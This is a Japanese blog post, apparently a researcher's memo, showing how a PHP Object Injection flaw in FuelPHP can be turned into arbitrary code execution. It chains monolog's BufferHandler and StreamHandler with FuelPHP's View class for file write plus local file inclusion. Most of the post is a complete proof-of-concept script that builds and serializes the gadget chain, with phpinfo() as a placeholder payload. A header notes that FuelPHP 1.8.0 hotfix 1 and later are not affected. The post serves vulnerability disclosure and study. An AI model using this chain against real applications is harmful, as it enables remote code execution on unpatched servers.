# FuelPHP での PHP Object Injection について

※2016-06-04 追記
[Changelog v1.8.0 hotfix 1](https://github.com/fuel/core/wiki/Changelog-v1.8.0-hotfix-1)
こちらのアップデートにより、 FuelPHP で使用される monolog がバージョンアップされました。その結果以下に記載の方法は 1.8.0 hotfix 1 以上の FuelPHP に対しては有効ではなくなっています。

---

[PHPにおけるオブジェクトインジェクション脆弱性について](http://blog.a-way-out.net/blog/2014/07/22/php-object-injection/) の下記の部分について。

> 私の調べた範囲では、FuelPHP自体にはこの脆弱性により任意のコードを実行できるようなクラスはありませんでした（ただし、ファイルを削除することは可能でした。また、ユーザの作成したクラスに脆弱なものが存在する可能性もあります）。
>
> 次のCakePHPの事例のように複雑な組み合わせで攻撃できる可能性があるため、ちょっと見ただけで問題ないとは簡単には言えません。もし、FuelPHPのクラスで任意のコードを実行する方法を発見された方がいましたら、お教え願いたいです。


明記されたものが見つからなかったので備忘録代わりに書きます。

FuelPHP では [composer.json](https://github.com/fuel/fuel/blob/1.8/master/composer.json#L17) に記載があるとおり monolog ライブラリが使われています。
PHP Object Injection が存在する場合に monolog のクラスを利用して任意のコードを実行させる方法が既に公表されており、 [Laravel cookie forgery, decryption, and RCE](https://labs.mwrinfosecurity.com/blog/laravel-cookie-forgery-decryption-and-rce/) に記載があります。
ですので FuelPHP をインストールしたデフォルトの状態では、 PHP Object Injection があった場合に任意のコードが実行可能になっています。

[Practical PHP Object Injection](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf) p.45 にも記載があるとおりこの方法は Arbitrary Write なので、 PHP アプリケーションがドキュメントルート以下に対する書き込み権限を持たない場合はそのまま用いることができません。
ただ、 monolog のクラスと FuelPHP の `Fuel\Core\View` クラスを組み合わせることで Local File Inclusion が可能になるため、ドキュメントルート以下に書き込み権限がない場合であっても以下の手順で任意のコード実行が可能です。

1. Arbitrary Write で /tmp などの書き込み可能なディレクトリ以下に攻撃用スクリプトを書き出す
2. Local File Inclusion により 1.で書き出したファイルを include させて攻撃用スクリプトを実行させる


PoC はこのようになります。

```php
<?php

namespace Monolog\Handler {
class BufferHandler
{
    protected $buffer = [];
    protected $bufferSize = 0;
    protected $handler;

    public function __construct($handler)
    {
        $this->handler = $handler;
    }

    public function handle(array $record)
    {
        $this->buffer[] = $record;
        $this->bufferSize++;
    }
}

class StreamHandler
{
    protected $url;

    public function __construct($stream)
    {
        $this->url = $stream;
    }
}
}

namespace Fuel\Core {
class View
{
    protected $file_name;

    public function __construct($file)
    {
        $this->file_name = $file;
    }
}
}


namespace {
function main()
{
    $code = <<<'CODE'
<?php phpinfo(); exit; ?>
CODE;
    $targetFile = 'target-file.php';
    $arbitraryWrite = new Monolog\Handler\BufferHandler(
        new Monolog\Handler\StreamHandler($targetFile)
    );
    $arbitraryWrite->handle([
        'level' => 100, // Logger::DEBUG
        'message' => $code,
        'extra'  => [],
    ]);

    $view = new Fuel\Core\View($targetFile);
    $localFileInclusion = new Monolog\Handler\BufferHandler(
        new Monolog\Handler\StreamHandler($view)
    );
    $localFileInclusion->handle([
        'level' => 100, // Logger::DEBUG,
        'message' => 'foobar',
        'extra' => [],
    ]);

    echo bin2hex(serialize([$arbitraryWrite, $localFileInclusion]));
}

main();
}
```
